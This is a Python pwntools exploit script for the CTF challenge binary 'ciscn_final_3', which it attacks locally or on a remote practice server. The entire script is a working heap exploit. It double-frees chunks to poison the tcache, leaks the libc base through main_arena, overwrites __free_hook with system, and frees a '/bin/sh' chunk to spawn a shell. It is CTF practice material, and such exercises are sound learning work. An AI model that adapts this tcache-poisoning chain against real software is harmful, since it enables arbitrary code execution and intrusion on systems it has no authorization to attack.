#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'ciscn_final_3'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28452

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(idx, size, data):
	sla('choice > ', str(1))
	sla('index\n', str(idx))
	sla('size\n', str(size))
	sa('something\n', data)
	ru('0x')
	return int(r(12), 16)

def rm(idx):
	sla('choice > ', str(2))
	sla('index\n', str(idx))

def q():
	sla('choice > ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	sh_addr = ad(0, 0x58, '/bin/sh')	
	li('sh_addr ' + hex(sh_addr))
	cout_addr = sh_addr - 0x11c10

	# dub free use teache attack to cout_addr
	ad(1, 0x10, 'A')
	rm(1)
	rm(1)

	ad(2, 0x10, p64(cout_addr)) #modify fd as cout_addr
	ad(3, 0x10, 'A') # for ajust
	ad(4, 0x10, 'B') # malloc chunk to cout_addr
	ad(5, 0x20, 'C') # for fastbin attack to main_arena

	# teache attack to 
	rm(4)

	rm(5)
	rm(5)
	
	ad(6, 0x20, p64(cout_addr)) #modify fd-> cout_addr -> main_arena + 98
	ad(7, 0x20, 'A') # -> cout_addr
	ad(8, 0x20, 'B') # -> main_arena

	# leak libc base

	main_arena = ad(9, 0x20, 'CCCC') - 96
	lib.address = main_arena - 0x3ebc40
	li('main_arena ' + hex(main_arena))
	li('libc_base  ' + hex(lib.address))

	# use teache bin attack to modify free_hook
	ad(10, 0x30, 'A')
	rm(10)
	rm(10)

	ad(11, 0x30, p64(lib.sym['__free_hook']))
	ad(12, 0x30, p64(0)) # for ajust
	ad(13, 0x30, p64(lib.sym['system'])) # modify free_hook as system

	# get shell
	rm(0)

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
